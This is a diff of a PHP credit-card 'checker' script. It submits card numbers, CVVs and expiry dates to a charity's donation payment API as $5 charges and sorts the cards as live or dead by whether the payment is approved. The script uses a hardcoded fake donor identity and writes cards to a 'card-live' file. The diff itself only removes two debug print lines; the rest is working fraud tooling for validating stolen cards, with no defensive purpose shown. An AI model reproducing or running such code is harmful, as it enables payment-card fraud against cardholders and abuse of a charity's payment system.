@@ -30,11 +30,9 @@ $typeCC2 = (substr($card,0,1) == 4 ? "Visa" : (substr($card,0,1) == 3 ? "Amex" :
 $gas = curl('https://us.movember.com/api/v18/payment', '{"countryCode":"us","locale":"en_US","source":"online","recipientDetails":{"entityType":"general","entityId":97},"donorAddress":{"address1":"jakarta","address2":"jakarta","suburb":"portland","state":"OR","postcode":"97220","countryCode":"us"},"phoneNumber":"(812) 412-3123","donorDetails":{"email":"dowerarts@gmail.com","firstname":"apri","lastname":"amsyah","message":"","receipt":{"isBusiness":false,"businessName":"","firstname":"apri","lastname":"amsyah","taxId":""},"subscribe":true,"confirm_mov_email":""},"tz":"ICT","giftaid":false,"paymentDetails":{"paymentMethod":"card","amount":"5","currency":"USD","transactionFeeEnabled":true,"creditCard":{"cardNumber":"'.$card.'","cardholderName":"apri amsyah","cardCVV":"'.$cvv.'","cardExpiryMonth":"'.$month.'","cardExpiryYear":"'.$year.'","cardType":{"name":"'.$typeCC.'","pattern":{},"valid_length":[16,13]}},"paypal":{},"visaCheckout":{},"masterPass":{},"adyen":{},"directDebit":{}},"donationPrivate":false,"donationAnonymous":false,"cause_id":null,"event_id":null,"recurring":false,"g-recaptcha-response":"","csrfKey":"react-donation-form","csrfToken":"7d442d70a11e9f7c76949403fc48cc430cb8e02cd5417dd86c7e87239e9658b2","browserInfo":{}}', $headers);
 if (strpos($gas[1], 'approved')) {
 		echo "[Live] [$typeCC2 $type]  $card|$month|$year|$cvv BIN : $cate $country \n";
-		print_r($gas[1]);
 	} else {	
 		echo "[Die] [$typeCC2 $type] $card|$month|$year|$cvv BIN : $cate $country\n";
 		fwrite(fopen("card-live.txt", "a"), "[Live CC] | $card|$month|$year|$cvv\n");
-		print_r($gas[1]);
 	}
 }
 
